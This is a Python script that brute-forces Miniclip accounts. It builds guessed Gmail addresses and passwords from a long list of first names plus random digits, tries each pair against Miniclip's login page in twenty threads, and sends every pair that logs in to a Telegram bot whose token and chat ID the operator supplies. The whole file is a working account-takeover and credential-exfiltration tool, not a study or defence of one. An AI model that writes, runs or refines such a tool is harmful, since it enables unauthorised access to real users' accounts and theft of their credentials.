import requests
from bs4 import BeautifulSoup
import random
import threading
import time

token = input("TOKEN BOTK: ")
ID = input("ID MALTK: ")

def generate_email_password():
    Nasr = ''.join(random.choice(['Muhammed', 'Yad', 'Kurdish', 'Hasan', 'Ada', 'Adriano', 'Afro', 'Agata', 'Alberto', 'Alessandra', 'Alessandro', 'Alessia', 'Alessio', 'Alfredo', 'Alice', 'Allegra', 'Alma', 'Amabel', 'Gabriel', 'Lucas', 'Matheus', 'Guilherme', 'Bruno', 'Rafael', 'Felipe', 'Thiago', 'Pedro', 'Carlos', 'rex', 'fred', 'jon', 'rosa', 'rimi', 'toni', 'niko', 'salah', 'jamal', 'lxml', 'James', 'Robert', 'John', 'Michael', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Anthony', 'Mark', 'Donald', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Kenneth', 'Kevin', 'Brian', 'George', 'Timothy', 'Ronald', 'Edward', 'Jason', 'Jeffrey', 'Ryan', 'Jacob', 'Gary', 'ahmed', 'naser', 'yousef', 'reda', 'mohamed', 'salah', 'user', 'tiktok', 'tik', 'ali', 'user', 'toker', 'ali', 'mohmaed', 'iran', 'iraq', 'boos', 'GINK', 'fast', 'ksmiran', 'eya', 'ahmed', 'mariem', 'firas', 'ghada', 'mohamed', 'rania', 'aziz', 'emna', 'mehdi', 'cyrine', 'sami', 'sarah', 'yassine', 'fatma', 'amine', 'salma', 'karim', 'malek', 'med', 'sarra', 'aymen', 'wafa', 'mohamed', 'yosr', 'ali', 'erij', 'ayoub', 'imen', 'adam', 'mel', 'khalil', 'ghofrane', 'khaled', 'khouloud', 'hamza', 'hiba', 'rayen', 'amani', 'sara', 'marwan', 'ines', 'sufi', 'rihab', 'houssem', 'dhifef', 'ibrahim', 'esra', 'hani', 'maram', 'marouen', 'nesrine','alaa', 'syrine', 'hedy', 'user', 'user', 'tik', 'qwer', 'abood', 'jerry', 'roger', 'brian', 'dainel', 'patrick', 'floresjohn', 'ricardo', 'grace', 'nicholas', 'james', 'scottking', 'price', 'williams', 'steven', 'michael', 'dgray', 'ryan', 'john', 'jacob', 'charles', 'james', 'walker', 'jesus', 'hamada', 'yousif', 'ayman', 'ozgi', 'jakson', 'fares', 'faris', 'kamal', 'amjad', 'blail', 'bayan', 'fadil', 'younes','Joshua','abood','hashim','osman','zack','salim','salem','amar','saud','falah','khalif','gamer','hima','rima','assha','ozgi','yagiz','ryan','riyan','mkaml','Nasr']) for m in range(1))
    numbers1 = ''.join(random.choices('1234567890', k=random.randint(1, 3)))
    password = Nasr + numbers1
    email = f'{Nasr}{numbers1}@gmail.com'
    return email, password

def miniclip_checker(email, password):
    url = "https://me.miniclip.com/"
    payload = {"email": email, "password": password}
    response = requests.post(url, data=payload)
    soup = BeautifulSoup(response.content, "html.parser")
    return soup.find("div", {"class": "user-portal"}) is not None

def login_and_run_chk():
    while True:
        email, password = generate_email_password()
        if miniclip_checker(email, password):
            print(f"\033[096mLogin successful for {email} • {password}")
            devil = f"{email} \n {password}\n"
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= {devil} ')
        else:
            print(f"Invalid email or password for {email} - {password}")
        time.sleep(1)

E_TREADING = []
for i in range(20):  
    t = threading.Thread(target=login_and_run_chk)
    t.daemon = True
    t.start()
    E_TREADING.append(t)

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Program Devil.")
